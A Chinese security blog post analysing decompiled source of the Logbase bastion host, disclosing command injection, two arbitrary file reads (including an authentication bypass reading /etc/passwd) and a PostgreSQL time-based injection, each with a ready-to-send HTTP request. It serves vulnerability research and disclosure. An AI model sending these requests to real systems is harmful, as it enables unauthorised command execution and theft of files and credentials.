#  Logbase思迪福堡垒机漏洞分析   
 WK安全   2023-12-17 09:52  
  
赛  
博大作战中的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。  
利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。  
本文所提供的工具仅用于学习，禁止用于其他！  
！  
！  
  
  
**1**  
  
**前言**  
  
  
最近看到网上发布了这个堡垒机的rce  
```
https://mp.weixin.qq.com/s/tWRD9oYo5eNeyLcf_pv2ew
https://mp.weixin.qq.com/s/rmWBOQaE4aSxWI9VYBRpHg
...
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XgESLk8apdL9X07AbibyVgDW8fcGndSC6sfdqoHCR2Ram7w0Twj5dY6A/640?wx_fmt=png&from=appmsg&random=0.18119871894036566&random=0.8291540263732109&random=0.4214362794444373&random=0.46608159963020146 "")  
  
抱  
着水点公众号文章的想法，弄了份源码看了下，发现源码并不大，结构也不复杂，正好符合我们水文章的需求，开整！  
  
首先，该堡垒机程序是python编译成pyc文件运行的，我们先进行反编译  
```
// 安装
pip install uncompyle6

// 查看版本
uncompyle6 --version

// 使用，-o outfile必须先写，例如有一个pcat.pyc，想反编译输出文件为pcat.py
uncompyle6 -o pcat.py pcat.pyc
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85X1uCib0vnWdCVFReh4CicVEdqibgwF2lLCRAic1ozVTOkPajyZFewPL1HDw/640?wx_fmt=png&from=appmsg&random=0.16840961598006388&random=0.44772637866305454&random=0.45081367106919945&random=0.5532304483015746&random=0.5249568115760692&random=0.6269413795099075&random=0.9600018222865565&random=0.7095187209000307&random=0.3898473470374837&random=0.3297611296727587&random=0.9661842628988344&random=0.22268031554682333&random=0.9763858326085599&random=0.014747354446745797 "")  
  
通过一顿反编译我们就得到了源码，就可以开始正式审计了  
  
**2**  
  
**路由分析**  
  
  
我们直接来挖前台可以被利用的漏洞，路由的话，因为是python写的，其实还是比较明显的  
```
# \dev\shm\www\manage\bhost\login.py
@app.route("/lchk", methods=['GET', 'POST']) // 对应请求url为 http://xxxx/bhost/lchk
  ....

# 认证机制基本上是：
# 客户端输入账号密码->服务端匹配成功的情况->返回session，客户端拿着这个session再去请求其他的需要权限校验的接口
# 由于得到的代码不全并没有sessionchek的定义，就先不管这些
```  
  
‍  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85X2gaJFxsOH8elzloxkPd9sLMH8icggg9lUMY7jOBibezpC2HQ7oUkglOA/640?wx_fmt=png&from=appmsg&random=0.1530603351279951&random=0.15316727716257672&random=0.3472111928630346&random=0.9771331502742222&random=0.7342007637784642&random=0.5480094110089189&random=0.35300603321678103&random=0.3118692052867611&random=0.1963133716293115&random=0.7444366606977437&random=0.03920383384383874&random=0.19490757838168005 "")  
  
使用自己平时写的静态分析工具进行一波分析，输出可能存在漏洞的接口信息输出：logbase.txt  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XOACVBn6BEyGxLpUnUAiadW5p7hPUDkBMpBIIAJHGEQx11v1OYdYWiaZA/640?wx_fmt=png&from=appmsg&random=0.007960717339163592&random=0.2873890265027246&random=0.6130279611939866&random=0.08916703450418995&random=0.48050561044593443&random=0.7484901577487142&random=0.8856947250595526&random=0.9555025022242676&random=0.06699178562929053&random=0.5304917098782802&random=0.7949902082203602&random=0.011410020657084408 "")  
  
**3**  
  
**test_qrcode_b命令执行漏洞**  
  

				  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XUYQRhlyiasQ56vt5Vr8kFEDJYK1nxIu3LXS0d2kSM7yzw8cyfpOia9VA/640?wx_fmt=png&from=appmsg&random=0.15031336552863928&random=0.6334609473073247&random=0.9734878846586883&random=0.8574337217978432&random=0.8488538238045906&random=0.4959180688770788&random=0.8084153008987276&random=0.11823942386100716 "")  
  
  
  
发现传参没过滤直接拼接从而造成了rce  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85Xlzj04rgRZt42AjdJnMQ88PVq1nLpSc20S5qWpbHsJx0IKlRK6vsdbQ/640?wx_fmt=png&from=appmsg&random=0.7745394237292382&random=0.4620930459291659&random=0.23834254152901124&random=0.07963564780970112&random=0.9831625464590432&random=0.540602856953661&random=0.6579588265736598&random=0.9194940290413989 "")  
  
```
数据包：
POST /bhost/test_qrcode_b HTTP/1.1
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip, deflate, br
Accept: gzip
Connection: close
Referer: 
Content-Type: application/x-www-form-urlencoded
Host: 
Content-Length: 23

z1=1&z2="|id;"&z3=bhost
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85Xia5P8aYRS1bugw6WH8UKzg85u6aVzgg2j6pg5zWQRBCmGC7JC1hsyBg/640?wx_fmt=png&from=appmsg&random=0.09763288162661699&random=0.4226243162133063&random=0.219865797313056&random=0.705332932737432&random=0.625723661304717&random=0.611593175682478&random=0.7912280168792127&random=0.945065619789013 "")  
  
  
**4**  
  
**GetCaCert接口任意文件读取**  
  

				  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85X4IRzR9doseTibwR6z2DiaQPFeQJNc6jjyZoQQ4icm9f4NBt1Fmib36ciaTQ/640?wx_fmt=png&from=appmsg&random=0.6120851667568667&random=0.04378784376734046&random=0.8049514810021352&random=0.5065766396888534&random=0.23060991521361407&random=0.13116327088537894&random=0.6889050802278673 "")  
  
```
# 发现传参没过滤直接拼接造成了任意文件读取
@app.route("/GetCaCert", methods=['GET', 'POST']) # 文件读取 参数a1
def GetCaCert():
  headers  = str(request.headers) ;
  debug(headers)
  if headers.find("a1") < 0:
    Name = request.args.get('a1')
  else:
    Name = headers.split('a1',0)[1].split()[1];
  
  try:
    if os.path.exists('/usr/etc/'+Name):
      fp = open('/usr/etc/'+Name,'r');
      # 返回读取的内容并base64
      a = base64.b64encode(fp.read());
      return a,200
    else:
      return '',400
  except pyodbc.Error,e:
    return '',400
```  
  
‍  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85Xq3U98QicAYYq2iapdT3D6GFXraVjxYv04w5aBl4APTDkBWKwSb7Dh9Vg/640?wx_fmt=png&from=appmsg&random=0.9506539124394073&random=0.9921458729112214&random=0.8029709714724205&random=0.3271683986553362&random=0.8309780895410175&random=0.014506925204482934&random=0.5806139507639756 "")  
  
  
返回base64的文件读取内容  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XkfqkoFpic8ZRGIzGjsUAvvl7icMfvEWKPTrfeHC1ftjzvnI8vUib2WX4A/640?wx_fmt=png&from=appmsg&random=0.009427360037876253&random=0.9717876976638191&random=0.004394311076287849&random=0.6560236763308225&random=0.5314726120511437&random=0.022926587603748994&random=0.927090977163624 "")  
  
  
**5**  
  
**bhTranDownload接口任意文件读取**  
  
```
1 根据阅读源码我们需要在请求头处构造poc

2 bhTranDownload接口其实是有判断逻辑，但因为判断逻辑有点毛病可以绕过，这里是有两个判断的
2.1 判断1：
def check_path(path):
  for one in list_path:
    if path.find(one) >=0:
      return True
  return False

list_path = ['/usr/storage/.system/upload','/usr/storage/.system/replay','/usr/storage/.system/software','/usr/storage/.system/update','/usr/storage/.system/config/backup','/usr/storage/.system/dwload','/usr/storage/.system/passwd','/usr/storage/.system/backup','/usr/storage/.system/transf','/usr/ssl/certs']
为
if check_path(Path) == False and Filename !='cf_tnsora': 
    return '-1',403;
    
为了绕过这个判断 我们需要把内容设置为list_path中的内容


2.2 判断2：
将/usr/storage/.system/software base64编码并且固定在此处就可以通过
if Path.find("/software") >=0 or Method =='GetSize' or Filename =='cf_tnsora':
  pass
else:
  sessioncheck
绕过下面图中的那个else:避免进入鉴权

3 基于上面的说法 我们选择/usr/storage/.system/software来进行base64绕过这些

则：
Filename:xxxxxxxxxxxxxxx../../../etc/passwd base64编码希望读取的漏洞路径
Path:L3Vzci9zdG9yYWdlLy5zeXN0ZW0vc29mdHdhcmU=  编码前的内容是/usr/storage/.system/software
最终实现任意文件读取
```  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XvW8m8cjMrOwaiaDHgfRvL5Dx275gzojgib7k1o1xRHqsK9U3utpHMMrA/640?wx_fmt=png&from=appmsg&random=0.08121205211502769&random=0.6747149408401723&random=0.604805640360758&random=0.13985306000025344&random=0.6866578653588389&random=0.6318382401740361 "")  
  
```
GET /bhost/bhTranDownload  HTTP/1.1
Host: xxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Filename:xxxxxxxxxxxxxxx../../../etc/passwd base64编码希望读取的漏洞路径
Session:111
Path:L3Vzci9zdG9yYWdlLy5zeXN0ZW0vc29mdHdhcmU= 编码前的内容是/usr/storage/.system/software
Offset:0
Content-Length: 2
Sesstimet:111
Referer: https://xxxxxxxxx/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85X0qyIcxtOZicmj6xHRaicLMk8tS9b09CJaafjZy9EqUECRBPxNDO8mic3A/640?wx_fmt=png&from=appmsg&random=0.5980063030069886&random=0.792706180035553&random=0.7490476979367706&random=0.2705308117477472&random=0.1920928485831228&random=0.2014329887774624 "")  
  
**6**  
  
**PostgreSQL 注入漏洞**  
  

				  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XHPbIhrDuiata0tl2Xaj6HkMrhiaWeoZBUzaib4cBP1zjuBR5vwliaQVxsQ/640?wx_fmt=png&from=appmsg&random=0.7496012270880368&random=0.9660548951257002&random=0.5525050070067268&random=0.9430231375400364&random=0.5213822234222605 "")  
  
  
发现传参没过滤直接拼接造成了注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85X3hGiaia15csgnvGgplicbOiaSRVvKeU5WpA8uCOxEIzUlveicPCQYO7rOicw/640?wx_fmt=png&from=appmsg&random=0.7209992174035327&random=0.0441212969697371&random=0.3582119436520448&random=0.7550736670562794&random=0.7483603998489745 "")  
```
POST /bhost/repeat_get_usb_status HTTP/1.1
Host: xxxxxxx
Cookie: bhost=xxxxxxxxxxxxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 20
Origin: https://xxxxxxxxxxx
Dnt: 1
Referer: https://xxxxxxxx/bhost/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

z1='||pg_sleep(2)||'
```  
  
‍  
每pg_sleep(1)是2000mills延迟，这洞版本有点老，找半天才复现成功  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XTicktE8iaoT9FpMY1e1o9rmibZqsnfHKOmp983KY4ibJUvG6tIOf0W2piag/640?wx_fmt=png&from=appmsg&random=0.21588578084438725&random=0.8141424862825308&random=0.790938986802997&random=0.5415936384825779&random=0.610915142361024 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XXiaUlEHG3icP7KtibqLibGETwFY9f1ajH8YaWiaFOLZH3GnsvjhgsaHwJxg/640?wx_fmt=png&from=appmsg&random=0.28744682960944745&random=0.8645135194247149&random=0.5324847817420986&random=0.06479196040790258&random=0.3089443952313242 "")  
  
   
  
**7**  
  
**总结**  
  

				  
总的来说这堡垒机比较老还是不少洞的，但新版本均修复了上述这些，分享出来供需者学习，水一篇文章吧。安全路远，交流技术可添加：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PEicib4sr4bLXibAdN6mvPqU4selKN0q85XBHNlyetyf9GEiapbbaH3Jwn6quu7KlNeYsc9f8QGnyia99QlL7Zgqarw/640?wx_fmt=jpeg&from=appmsg&random=0.5606427801488534&random=0.5803736256082925&random=0.6955808587991792&random=0.6161663899245626 "")  
  
  
  
